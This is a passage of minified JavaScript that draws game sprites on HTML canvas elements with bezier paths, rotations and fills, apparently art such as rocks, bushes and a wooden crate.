      n.bezierCurveTo(e * 35, e * 56, e * 36, e * 109, e * 35, e * 110);
      n.closePath();
      ye(n, undefined, t[7], 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 123, e * 6);
      n.bezierCurveTo(e * 123, e * 56, e * 123, e * 56, e * 123, e * 110);
      n.closePath();
      ye(n, undefined, t[7], 4);
      n.save();
      n.translate(e * 79, e * 113);
      Be(n, e * -18, e * -2, e * 36, e * 4, e * 20);
      n.restore();
      ye(n, undefined, t[8], 4);
      n.save();
      n.translate(e * 75, e * 118);
      Be(n, e * -6, e * -2.5, e * 20, e * 5, e * 20);
      n.restore();
      ye(n, t[8]);
      return r;
    }
    function Wt(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 92;
      r.height = e * 108;
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 31, e * 10);
      n.bezierCurveTo(e * 37, e * 2, e * 49, e * 0, e * 61, e * 15);
      n.bezierCurveTo(e * 81, e * 31, e * 78, e * 25, e * 79, e * 37);
      n.bezierCurveTo(e * 76, e * 44, e * 81, e * 56, e * 85, e * 63);
      n.bezierCurveTo(e * 91, e * 71, e * 90, e * 78, e * 83, e * 84);
      n.bezierCurveTo(e * 60, e * 98, e * 67, e * 95, e * 57, e * 102);
      n.bezierCurveTo(e * 47, e * 106, e * 43, e * 106, e * 31, e * 98);
      n.bezierCurveTo(e * 22, e * 91, e * 17, e * 89, e * 7, e * 84);
      n.bezierCurveTo(e * 1, e * 77, e * 4, e * 73, e * 7, e * 60);
      n.bezierCurveTo(e * 11, e * 50, e * 5, e * 32, e * 15, e * 27);
      n.bezierCurveTo(e * 26, e * 18, e * 26, e * 24, e * 31, e * 10);
      n.closePath();
      ye(n, t[0], t[1], 4);
      return r;
    }
    function Vt(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 151;
      r.height = e * 80;
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 133, e * 54);
      n.bezierCurveTo(e * 136, e * 18, e * 129, e * 18, e * 114, e * 13);
      n.bezierCurveTo(e * 51, e * 0, e * 36, e * 16, e * 34, e * 16);
      n.bezierCurveTo(e * 8, e * 28, e * 22, e * 56, e * 21, e * 57);
      n.closePath();
      ye(n, t[2], t[3], 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 130, e * 40);
      n.bezierCurveTo(e * 132, e * 35, e * 132, e * 30, e * 132, e * 29);
      n.bezierCurveTo(e * 145, e * 38, e * 144, e * 43, e * 137, e * 54);
      n.closePath();
      ye(n, t[0], t[1], 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 20, e * 33);
      n.bezierCurveTo(e * 24, e * 44, e * 215, e * 39, e * 23, e * 44);
      n.bezierCurveTo(e * 19, e * 49, e * 19, e * 49, e * 15, e * 54);
      n.bezierCurveTo(e * 4, e * 43, e * 10, e * 35, e * 20, e * 32);
      n.closePath();
      ye(n, t[0], t[1], 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 18, e * 52);
      n.bezierCurveTo(e * 24, e * 31, e * 34, e * 25, e * 75, e * 23);
      n.bezierCurveTo(e * 130, e * 24, e * 129, e * 32, e * 134, e * 51);
      n.bezierCurveTo(e * 138, e * 70, e * 126, e * 72, e * 90, e * 73);
      n.bezierCurveTo(e * 18, e * 72, e * 15, e * 68, e * 18, e * 54);
      n.closePath();
      ye(n, t[0], t[1], 4);
      return r;
    }
    function wt(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 138;
      r.height = e * 133;
      n.globalAlpha = i ? 0.3 : 1;
      n.translate(0, e * 5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 26, e * 79.640625);
      n.bezierCurveTo(e * 13, e * 84.640625, e * 9, e * 86.640625, e * 7, e * 78.640625);
      n.bezierCurveTo(e * 6, e * 69.640625, e * 15, e * 67.640625, e * 31, e * 62.640625);
      n.bezierCurveTo(e * 63, e * 55.640625, e * 85, e * 57.640625, e * 104, e * 63.640625);
      n.bezierCurveTo(e * 131, e * 69.640625, e * 132, e * 71.640625, e * 131, e * 78.640625);
      n.bezierCurveTo(e * 131, e * 91.640625, e * 112, e * 80.640625, e * 91, e * 75.640625);
      n.bezierCurveTo(e * 51, e * 70.640625, e * 45, e * 74.640625, e * 28, e * 78.640625);
      n.closePath();
      ye(n, t[0]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 8, e * 82.640625);
      n.bezierCurveTo(e * 40, e * 107.640625, e * 53, e * 104.640625, e * 67, e * 106.640625);
      n.bezierCurveTo(e * 101, e * 103.640625, e * 117, e * 93.640625, e * 127, e * 84.640625);
      n.bezierCurveTo(e * 135, e * 95.640625, e * 131, e * 107.640625, e * 110, e * 118.640625);
      n.bezierCurveTo(e * 78, e * 129.640625, e * 67, e * 130.640625, e * 27, e * 119.640625);
      n.bezierCurveTo(e * 0, e * 105.640625, e * 8, e * 83.640625, e * 10, e * 84.640625);
      n.closePath();
      ye(n, t[0]);
      n.globalAlpha = 1;
      n.translate(0, e * -5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 8, e * 73.640625);
      n.bezierCurveTo(e * 7, e * 23.640625, e * 33, e * 19.640625, e * 71, e * 17.640625);
      n.bezierCurveTo(e * 129, e * 19.640625, e * 130, e * 45.640625, e * 130, e * 76.640625);
      n.bezierCurveTo(e * 90, e * 63.640625, e * 85, e * 63.640625, e * 73, e * 63.640625);
      n.bezierCurveTo(e * 38, e * 63.640625, e * 33, e * 66.640625, e * 8, e * 73.640625);
      n.closePath();
      ye(n, t[1], t[2], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 72, e * 28.640625);
      n.bezierCurveTo(e * 51, e * 25.640625, e * 56, e * 7.640625, e * 70, e * 5.640625);
      n.bezierCurveTo(e * 94, e * 7.640625, e * 87, e * 29.640625, e * 72, e * 28.640625);
      n.closePath();
      ye(n, t[3], t[2], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 51, e * 26.640625);
      n.bezierCurveTo(e * 42, e * 29.640625, e * 43, e * 31.640625, e * 42, e * 37.640625);
      ye(n, undefined, t[2], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 90, e * 26.640625);
      n.bezierCurveTo(e * 100, e * 28.640625, e * 98, e * 34.640625, e * 99, e * 38.640625);
      ye(n, undefined, t[2], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 26, e * 79.640625);
      n.bezierCurveTo(e * 13, e * 84.640625, e * 9, e * 86.640625, e * 7, e * 78.640625);
      n.bezierCurveTo(e * 6, e * 69.640625, e * 15, e * 67.640625, e * 31, e * 62.640625);
      n.bezierCurveTo(e * 63, e * 55.640625, e * 85, e * 57.640625, e * 104, e * 63.640625);
      n.bezierCurveTo(e * 131, e * 69.640625, e * 132, e * 71.640625, e * 131, e * 78.640625);
      n.bezierCurveTo(e * 131, e * 91.640625, e * 112, e * 80.640625, e * 91, e * 75.640625);
      n.bezierCurveTo(e * 51, e * 70.640625, e * 45, e * 74.640625, e * 28, e * 78.640625);
      n.closePath();
      ye(n, t[3], t[4], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 8, e * 82.640625);
      n.bezierCurveTo(e * 40, e * 107.640625, e * 53, e * 104.640625, e * 67, e * 106.640625);
      n.bezierCurveTo(e * 101, e * 103.640625, e * 117, e * 93.640625, e * 127, e * 84.640625);
      n.bezierCurveTo(e * 135, e * 95.640625, e * 131, e * 107.640625, e * 110, e * 118.640625);
      n.bezierCurveTo(e * 78, e * 129.640625, e * 67, e * 130.640625, e * 27, e * 119.640625);
      n.bezierCurveTo(e * 0, e * 105.640625, e * 8, e * 83.640625, e * 10, e * 84.640625);
      n.closePath();
      ye(n, t[3], t[4], e * 4);
      return r;
    }
    function Kt(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      var a = e * 170;
      var o = e * 172;
      var s = a / 2;
      var _ = o / 2;
      r.width = a;
      r.height = o;
      n.translate(s, _ + e * 7);
      n.globalAlpha = i ? 0.5 : 0;
      ze(n, 0, 0, e * 60);
      ye(n, t[0]);
      n.globalAlpha = 1;
      n.translate(0, e * -7);
      n.save();
      for (var E = 0; E < 10; E++) {
        n.rotate(Math.PI / 5);
        n.save();
        n.translate(e * 65, 0);
        Ve(n, 3, e * 20, e * 4);
        ye(n, t[1], t[2], e * 4);
        n.restore();
      }
      n.restore();
      ze(n, 0, 0, e * 60);
      ye(n, t[3], t[4], e * 4);
      ze(n, 0, 0, e * 40);
      ye(n, t[5]);
      ze(n, 0, 0, e * 25);
      ye(n, t[6], t[7], e * 8);
      return r;
    }
    function Ut(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 170;
      r.height = e * 170;
      n.globalAlpha = i ? 0.5 : 1;
      n.translate(0, e * 5);
      n.save();
      n.translate(e * 85, e * 88);
      n.rotate(1.4);
      Ve(n, 7, e * 60, e * 10);
      n.restore();
      ye(n, t[0]);
      n.globalAlpha = 1;
      n.translate(e * 85, e * 80);
      for (var a = 0; a < 10; a++) {
        n.rotate(Math.PI / 5);
        n.save();
        n.translate(e * 65, 0);
        Ve(n, 3, e * 21, e * 4);
        ye(n, t[1], t[2], e * 4);
        n.restore();
      }
      n.save();
      n.translate(e * 0, e * 0);
      n.rotate(1.4);
      Ve(n, 7, e * 60, e * 10);
      ye(n, t[3], t[4], e * 4);
      n.rotate(0.64);
      Ve(n, 7, e * 40, e * 10);
      ye(n, t[5], t[6], e * 4);
      n.rotate(0.12);
      Ve(n, 7, e * 23, e * 5);
      n.restore();
      ye(n, t[7]);
      return r;
    }
    function Yt(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 170;
      r.height = e * 170;
      n.globalAlpha = i ? 0.5 : 1;
      n.translate(0, e * 3);
      n.save();
      n.translate(e * 85, e * 95);
      n.rotate(1.4);
      Ve(n, 7, e * 60, e * 10);
      n.restore();
      ye(n, t[0]);
      n.globalAlpha = 1;
      n.translate(e * 85, e * 82);
      for (var a = 0; a < 10; a++) {
        n.rotate(Math.PI / 5);
        n.save();
        n.translate(e * 65, 0);
        Ve(n, 3, e * 21, e * 4);
        ye(n, t[1], t[2], e * 4);
        n.restore();
      }
      n.save();
      n.translate(e * 0, e * 0);
      n.rotate(1);
      Ve(n, 8, e * 60, e * 10);
      ye(n, t[3], t[4], e * 4);
      n.rotate(0.56);
      Ve(n, 8, e * 40, e * 10);
      ye(n, t[5], t[6], e * 4);
      n.rotate(0.28);
      Ve(n, 8, e * 28, e * 8);
      ye(n, t[7]);
      n.restore();
      return r;
    }
    function kt(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 170;
      r.height = e * 170;
      n.translate(0, e * 3);
      n.globalAlpha = i ? 0.5 : 1;
      n.save();
      n.translate(e * 85, e * 95);
      n.rotate(1.4);
      Ve(n, 7, e * 60, e * 10);
      n.restore();
      ye(n, t[0]);
      n.globalAlpha = 1;
      n.translate(e * 85, e * 82);
      for (var a = 0; a < 10; a++) {
        n.rotate(Math.PI / 5);
        n.save();
        n.translate(e * 65, 0);
        Ve(n, 3, e * 21, e * 4);
        ye(n, t[1], t[2], e * 4);
        n.restore();
      }
      n.save();
      n.translate(e * 0, e * 0);
      n.rotate(0.2);
      Ve(n, 9, e * 60, e * 10);
      ye(n, t[3], t[4], e * 4);
      n.rotate(-0.32);
      Ve(n, 9, e * 38, e * 10);
      ye(n, t[5], t[6], e * 4);
      n.rotate(0.68);
      Ve(n, 9, e * 20, e * 8);
      ye(n, t[7], t[8], e * 6);
      n.restore();
      return r;
    }
    function Ft(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 69;
      r.height = e * 120;
      n.globalAlpha = i ? 0.5 : 1;
      n.save();
      n.translate(e * 30, e * 84);
      Be(n, e * -6, e * -66.5, e * 8, e * 100, e * 10);
      n.restore();
      ye(n, t[0]);
      n.save();
      n.translate(e * 30, e * 45);
      Be(n, e * -9.5, e * -6.5, e * 16, e * 13, e * 10);
      n.restore();
      ye(n, t[0]);
      n.save();
      n.translate(e * 30, e * 17);
      Be(n, e * -7.5, e * -5.5, e * 12, e * 11, e * 10);
      n.restore();
      ye(n, t[0]);
      n.save();
      n.translate(e * 30, e * 31);
      Be(n, e * -26, e * -14.5, e * 52, e * 29, e * 5);
      n.restore();
      ye(n, t[0]);
      n.globalAlpha = 1;
      n.save();
      n.translate(e * 36, e * 79.140625);
      Be(n, e * -6, e * -66.5, e * 8, e * 100, e * 10);
      n.restore();
      ye(n, t[1], t[2], e * 3);
      n.save();
      n.translate(e * 35, e * 40.140625);
      Be(n, e * -9.5, e * -6.5, e * 16, e * 13, e * 10);
      n.restore();
      ye(n, t[3], t[4], e * 3);
      n.save();
      n.translate(e * 35, e * 12.140625);
      Be(n, e * -7.5, e * -5.5, e * 12, e * 11, e * 10);
      n.restore();
      ye(n, t[3], t[4], e * 3);
      n.save();
      n.translate(e * 34.5, e * 26.140625);
      Be(n, e * -26, e * -14.5, e * 52, e * 29, e * 5);
      n.restore();
      ye(n, t[3], t[4], e * 3);
      return r;
    }
    function xt(e, i, t) {
      var r = (n = document.createElement("canvas")).getContext("2d");
      if (t == 0) {
        n.width = e * 566;
        n.height = e * 429;
        r.beginPath();
        r.lineCap = "round";
        r.lineJoin = "round";
        r.moveTo(e * 312.625, e * 39.046875);
        r.bezierCurveTo(e * 456.625, e * 60.046875, e * 521.625, e * 134.046875, e * 528.625, e * 199.046875);
        r.bezierCurveTo(e * 540.625, e * 298.046875, e * 491.625, e * 364.046875, e * 405.625, e * 394.046875);
        r.bezierCurveTo(e * 270.625, e * 429.046875, e * 182.625, e * 395.046875, e * 100.625, e * 344.046875);
        r.bezierCurveTo(e * 15.625, e * 283.046875, e * 20.625, e * 195.046875, e * 33.625, e * 158.046875);
        r.bezierCurveTo(e * 56.625, e * 80.046875, e * 102.625, e * 46.046875, e * 183.625, e * 33.046875);
        r.bezierCurveTo(e * 225.625, e * 25.046875, e * 270.625, e * 30.046875, e * 312.625, e * 39.046875);
        r.closePath();
        ye(r, i[0]);
      } else if (t == 1) {
        r = (n = document.createElement("canvas")).getContext("2d");
        n.width = e * 511;
        n.height = e * 408;
        r.beginPath();
        r.lineCap = "round";
        r.lineJoin = "round";
        r.moveTo(e * 141.625, e * 49.296875);
        r.bezierCurveTo(e * 225.625, e * 10.296875, e * 320.625, e * 16.296875, e * 390.625, e * 39.296875);
        r.bezierCurveTo(e * 476.625, e * 71.296875, e * 483.625, e * 142.296875, e * 486.625, e * 197.296875);
        r.bezierCurveTo(e * 491.625, e * 289.296875, e * 462.625, e * 317.296875, e * 417.625, e * 351.296875);
        r.bezierCurveTo(e * 367.625, e * 385.296875, e * 313.625, e * 404.296875, e * 218.625, e * 395.296875);
        r.bezierCurveTo(e * 108.625, e * 381.296875, e * 81.625, e * 350.296875, e * 52.625, e * 305.296875);
        r.bezierCurveTo(e * 16.625, e * 244.296875, e * 23.625, e * 171.296875, e * 37.625, e * 145.296875);
        r.bezierCurveTo(e * 65.625, e * 84.296875, e * 97.625, e * 74.296875, e * 141.625, e * 49.296875);
        r.closePath();
        ye(r, i[0]);
      } else if (t == 2) {
        var n;
        r = (n = document.createElement("canvas")).getContext("2d");
        n.width = e * 504;
        n.height = e * 408;
        r.beginPath();
        r.lineCap = "round";
        r.lineJoin = "round";
        r.moveTo(e * 153.625, e * 46.296875);
        r.bezierCurveTo(e * 271.625, e * 17.296875, e * 345.625, e * 35.296875, e * 410.625, e * 71.296875);
        r.bezierCurveTo(e * 473.625, e * 109.296875, e * 478.625, e * 167.296875, e * 473.625, e * 205.296875);
        r.bezierCurveTo(e * 462.625, e * 295.296875, e * 438.625, e * 316.296875, e * 388.625, e * 345.296875);
        r.bezierCurveTo(e * 331.625, e * 374.296875, e * 273.625, e * 392.296875, e * 180.625, e * 387.296875);
        r.bezierCurveTo(e * 111.625, e * 380.296875, e * 86.625, e * 360.296875, e * 51.625, e * 309.296875);
        r.bezierCurveTo(e * 23.625, e * 267.296875, e * 25.625, e * 226.296875, e * 27.625, e * 175.296875);
        r.bezierCurveTo(e * 37.625, e * 99.296875, e * 88.625, e * 57.296875, e * 153.625, e * 46.296875);
        r.closePath();
        ye(r, i[0]);
      }
      return n;
    }
    function Jt(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 450;
      r.height = e * 260;
      n.translate(e * 10, e * 10);
      n.globalAlpha = i ? 0.5 : 1;
      n.translate(e * 20, e * 20);
      Be(n, 0, 0, e * 400, e * 220, e * 30);
      ye(n, t[0]);
      n.globalAlpha = 1;
      n.translate(e * -20, e * -20);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 9, e * 5);
      n.bezierCurveTo(e * 381, e * 2, e * 197, e * 4.5, e * 385, e * 4);
      n.bezierCurveTo(e * 397, e * 4, e * 401, e * 4, e * 399, e * 23);
      n.bezierCurveTo(e * 367, e * 27, e * 367, e * 27, e * 335, e * 31);
      n.bezierCurveTo(e * 366.5, e * 33.5, e * 366.5, e * 33.5, e * 398, e * 36);
      n.bezierCurveTo(e * 398, e * 41.5, e * 398, e * 41.5, e * 398, e * 47);
      n.bezierCurveTo(e * 398, e * 56, e * 399, e * 56, e * 386, e * 56);
      n.bezierCurveTo(e * 200.5, e * 56.5, e * 200.5, e * 56.5, e * 15, e * 57);
      n.bezierCurveTo(e * 2, e * 55, e * 4, e * 52, e * 4, e * 43);
      n.bezierCurveTo(e * 4, e * 30.5, e * 4, e * 30.5, e * 4, e * 18);
      n.bezierCurveTo(e * 16, e * 18.5, e * 16, e * 18.5, e * 28, e * 19);
      n.bezierCurveTo(e * 18.5, e * 12, e * 18.5, e * 12, e * 9, e * 5);
      n.closePath();
      ye(n, t[2], t[1], e * 12);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 5, e * 70);
      n.bezierCurveTo(e * 5, e * 58, e * 5, e * 55, e * 17, e * 57);
      n.bezierCurveTo(e * 203, e * 57, e * 203, e * 57, e * 389, e * 57);
      n.bezierCurveTo(e * 400, e * 57, e * 400, e * 59, e * 400, e * 69);
      n.bezierCurveTo(e * 400.5, e * 83.5, e * 400.5, e * 83.5, e * 401, e * 98);
      n.bezierCurveTo(e * 402, e * 108, e * 401, e * 108, e * 388, e * 108);
      n.bezierCurveTo(e * 201.5, e * 108, e * 201.5, e * 108, e * 15, e * 108);
      n.bezierCurveTo(e * 1, e * 106, e * 5, e * 106, e * 5, e * 87);
      n.bezierCurveTo(e * 33, e * 84.5, e * 33, e * 84.5, e * 61, e * 82);
      n.bezierCurveTo(e * 33.5, e * 76.5, e * 33.5, e * 76.5, e * 6, e * 71);
      n.closePath();
      ye(n, t[3], t[1], e * 12);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 19, e * 158);
      n.bezierCurveTo(e * 2, e * 159, e * 4, e * 156, e * 5, e * 118);
      n.bezierCurveTo(e * 4, e * 110, e * 6, e * 107, e * 26, e * 109);
      n.bezierCurveTo(e * 206.5, e * 109, e * 206.5, e * 109, e * 387, e * 109);
      n.bezierCurveTo(e * 400, e * 108, e * 400, e * 108, e * 398, e * 127);
      n.bezierCurveTo(e * 384.5, e * 130, e * 384.5, e * 130, e * 371, e * 133);
      n.bezierCurveTo(e * 385.5, e * 138, e * 385.5, e * 138, e * 400, e * 143);
      n.bezierCurveTo(e * 402, e * 156, e * 402, e * 162, e * 385, e * 160);
      n.closePath();
      ye(n, t[2], t[1], e * 12);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 4, e * 183);
      n.bezierCurveTo(e * 1, e * 163, e * 4, e * 158, e * 28, e * 161);
      n.bezierCurveTo(e * 207.5, e * 161, e * 207.5, e * 161, e * 387, e * 161);
      n.bezierCurveTo(e * 401, e * 159, e * 400, e * 164, e * 400, e * 177);
      n.bezierCurveTo(e * 364.5, e * 184, e * 364.5, e * 184, e * 329, e * 191);
      n.bezierCurveTo(e * 364.5, e * 192.5, e * 364.5, e * 192.5, e * 400, e * 194);
      n.bezierCurveTo(e * 403, e * 209, e * 401, e * 214, e * 385, e * 213);
      n.bezierCurveTo(e * 201.5, e * 213, e * 201.5, e * 213, e * 18, e * 213);
      n.bezierCurveTo(e * 3, e * 213, e * 2, e * 213, e * 4, e * 198);
      n.bezierCurveTo(e * 12.5, e * 193, e * 12.5, e * 193, e * 21, e * 188);
      n.closePath();
      ye(n, t[3], t[1], e * 12);
      ze(n, e * 41, e * 30, e * 14.7648230602334);
      ye(n, t[3], t[1], e * 12);
      ze(n, e * 369, e * 30, e * 15.556349186104045);
      ye(n, t[3], t[1], e * 12);
      ze(n, e * 364, e * 190, e * 15.620499351813308);
      ye(n, t[3], t[1], e * 12);
      ze(n, e * 41, e * 186, e * 15.556349186104045);
      ye(n, t[3], t[1], e * 12);
      return r;
    }
    function Xt(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 450;
      r.height = e * 260;
      n.translate(e * 10, e * 10);
      if (t == 1 || t == 2) {
        n.beginPath();
        n.lineCap = "round";
        n.lineJoin = "round";
        n.moveTo(e * 9, e * 5);
        n.bezierCurveTo(e * 381, e * 2, e * 197, e * 4.5, e * 385, e * 4);
        n.bezierCurveTo(e * 397, e * 4, e * 401, e * 4, e * 399, e * 23);
        n.bezierCurveTo(e * 367, e * 27, e * 367, e * 27, e * 335, e * 31);
        n.bezierCurveTo(e * 366.5, e * 33.5, e * 366.5, e * 33.5, e * 398, e * 36);
        n.bezierCurveTo(e * 398, e * 41.5, e * 398, e * 41.5, e * 398, e * 47);
        n.bezierCurveTo(e * 398, e * 56, e * 399, e * 56, e * 386, e * 56);
        n.bezierCurveTo(e * 200.5, e * 56.5, e * 200.5, e * 56.5, e * 15, e * 57);
        n.bezierCurveTo(e * 2, e * 55, e * 4, e * 52, e * 4, e * 43);
        n.bezierCurveTo(e * 4, e * 30.5, e * 4, e * 30.5, e * 4, e * 18);
        n.bezierCurveTo(e * 16, e * 18.5, e * 16, e * 18.5, e * 28, e * 19);
        n.bezierCurveTo(e * 18.5, e * 12, e * 18.5, e * 12, e * 9, e * 5);
        n.closePath();
        ye(n, i[3], i[3], e * 32);
        n.beginPath();
        n.lineCap = "round";
        n.lineJoin = "round";
        n.moveTo(e * 5, e * 70);
        n.bezierCurveTo(e * 5, e * 58, e * 5, e * 55, e * 17, e * 57);
        n.bezierCurveTo(e * 203, e * 57, e * 203, e * 57, e * 389, e * 57);
        n.bezierCurveTo(e * 400, e * 57, e * 400, e * 59, e * 400, e * 69);
        n.bezierCurveTo(e * 400.5, e * 83.5, e * 400.5, e * 83.5, e * 401, e * 98);
        n.bezierCurveTo(e * 402, e * 108, e * 401, e * 108, e * 388, e * 108);
        n.bezierCurveTo(e * 201.5, e * 108, e * 201.5, e * 108, e * 15, e * 108);
        n.bezierCurveTo(e * 1, e * 106, e * 5, e * 106, e * 5, e * 87);
        n.bezierCurveTo(e * 33, e * 84.5, e * 33, e * 84.5, e * 61, e * 82);
        n.bezierCurveTo(e * 33.5, e * 76.5, e * 33.5, e * 76.5, e * 6, e * 71);
        n.closePath();
        ye(n, i[3], i[3], e * 32);
        n.beginPath();
        n.lineCap = "round";
        n.lineJoin = "round";
        n.moveTo(e * 19, e * 158);
        n.bezierCurveTo(e * 2, e * 159, e * 4, e * 156, e * 5, e * 118);
        n.bezierCurveTo(e * 4, e * 110, e * 6, e * 107, e * 26, e * 109);
        n.bezierCurveTo(e * 206.5, e * 109, e * 206.5, e * 109, e * 387, e * 109);
        n.bezierCurveTo(e * 400, e * 108, e * 400, e * 108, e * 398, e * 127);
        n.bezierCurveTo(e * 384.5, e * 130, e * 384.5, e * 130, e * 371, e * 133);
        n.bezierCurveTo(e * 385.5, e * 138, e * 385.5, e * 138, e * 400, e * 143);
        n.bezierCurveTo(e * 402, e * 156, e * 402, e * 162, e * 385, e * 160);
        n.closePath();
        ye(n, i[3], i[3], e * 32);
        n.beginPath();
        n.lineCap = "round";
        n.lineJoin = "round";
        n.moveTo(e * 4, e * 183);
        n.bezierCurveTo(e * 1, e * 163, e * 4, e * 158, e * 28, e * 161);
        n.bezierCurveTo(e * 207.5, e * 161, e * 207.5, e * 161, e * 387, e * 161);
        n.bezierCurveTo(e * 401, e * 159, e * 400, e * 164, e * 400, e * 177);
        n.bezierCurveTo(e * 364.5, e * 184, e * 364.5, e * 184, e * 329, e * 191);
        n.bezierCurveTo(e * 364.5, e * 192.5, e * 364.5, e * 192.5, e * 400, e * 194);
        n.bezierCurveTo(e * 403, e * 209, e * 401, e * 214, e * 385, e * 213);
        n.bezierCurveTo(e * 201.5, e * 213, e * 201.5, e * 213, e * 18, e * 213);
        n.bezierCurveTo(e * 3, e * 213, e * 2, e * 213, e * 4, e * 198);
        n.bezierCurveTo(e * 12.5, e * 193, e * 12.5, e * 193, e * 21, e * 188);
        n.closePath();
        ye(n, i[3], i[3], e * 32);
        ze(n, e * 41, e * 30, e * 14.7648230602334);
        ye(n, i[3], i[3], e * 32);
        ze(n, e * 369, e * 30, e * 15.556349186104045);
        ye(n, i[3], i[3], e * 32);
        ze(n, e * 364, e * 190, e * 15.620499351813308);
        ye(n, i[3], i[3], e * 32);
        ze(n, e * 41, e * 186, e * 15.556349186104045);
        ye(n, i[3], i[3], e * 32);
      }
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 9, e * 5);
      n.bezierCurveTo(e * 381, e * 2, e * 197, e * 4.5, e * 385, e * 4);
      n.bezierCurveTo(e * 397, e * 4, e * 401, e * 4, e * 399, e * 23);
      n.bezierCurveTo(e * 367, e * 27, e * 367, e * 27, e * 335, e * 31);
      n.bezierCurveTo(e * 366.5, e * 33.5, e * 366.5, e * 33.5, e * 398, e * 36);
      n.bezierCurveTo(e * 398, e * 41.5, e * 398, e * 41.5, e * 398, e * 47);
      n.bezierCurveTo(e * 398, e * 56, e * 399, e * 56, e * 386, e * 56);
      n.bezierCurveTo(e * 200.5, e * 56.5, e * 200.5, e * 56.5, e * 15, e * 57);
      n.bezierCurveTo(e * 2, e * 55, e * 4, e * 52, e * 4, e * 43);
      n.bezierCurveTo(e * 4, e * 30.5, e * 4, e * 30.5, e * 4, e * 18);
      n.bezierCurveTo(e * 16, e * 18.5, e * 16, e * 18.5, e * 28, e * 19);
      n.bezierCurveTo(e * 18.5, e * 12, e * 18.5, e * 12, e * 9, e * 5);
      n.closePath();
      ye(n, i[1], i[0], e * 12);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 5, e * 70);
      n.bezierCurveTo(e * 5, e * 58, e * 5, e * 55, e * 17, e * 57);
      n.bezierCurveTo(e * 203, e * 57, e * 203, e * 57, e * 389, e * 57);
      n.bezierCurveTo(e * 400, e * 57, e * 400, e * 59, e * 400, e * 69);
      n.bezierCurveTo(e * 400.5, e * 83.5, e * 400.5, e * 83.5, e * 401, e * 98);
      n.bezierCurveTo(e * 402, e * 108, e * 401, e * 108, e * 388, e * 108);
      n.bezierCurveTo(e * 201.5, e * 108, e * 201.5, e * 108, e * 15, e * 108);
      n.bezierCurveTo(e * 1, e * 106, e * 5, e * 106, e * 5, e * 87);
      n.bezierCurveTo(e * 33, e * 84.5, e * 33, e * 84.5, e * 61, e * 82);
      n.bezierCurveTo(e * 33.5, e * 76.5, e * 33.5, e * 76.5, e * 6, e * 71);
      n.closePath();
      ye(n, i[2], i[0], e * 12);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 19, e * 158);
      n.bezierCurveTo(e * 2, e * 159, e * 4, e * 156, e * 5, e * 118);
      n.bezierCurveTo(e * 4, e * 110, e * 6, e * 107, e * 26, e * 109);
      n.bezierCurveTo(e * 206.5, e * 109, e * 206.5, e * 109, e * 387, e * 109);
      n.bezierCurveTo(e * 400, e * 108, e * 400, e * 108, e * 398, e * 127);
      n.bezierCurveTo(e * 384.5, e * 130, e * 384.5, e * 130, e * 371, e * 133);
      n.bezierCurveTo(e * 385.5, e * 138, e * 385.5, e * 138, e * 400, e * 143);
      n.bezierCurveTo(e * 402, e * 156, e * 402, e * 162, e * 385, e * 160);
      n.closePath();
      ye(n, i[1], i[0], e * 12);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 4, e * 183);
      n.bezierCurveTo(e * 1, e * 163, e * 4, e * 158, e * 28, e * 161);
      n.bezierCurveTo(e * 207.5, e * 161, e * 207.5, e * 161, e * 387, e * 161);
      n.bezierCurveTo(e * 401, e * 159, e * 400, e * 164, e * 400, e * 177);
      n.bezierCurveTo(e * 364.5, e * 184, e * 364.5, e * 184, e * 329, e * 191);
      n.bezierCurveTo(e * 364.5, e * 192.5, e * 364.5, e * 192.5, e * 400, e * 194);
      n.bezierCurveTo(e * 403, e * 209, e * 401, e * 214, e * 385, e * 213);
      n.bezierCurveTo(e * 201.5, e * 213, e * 201.5, e * 213, e * 18, e * 213);
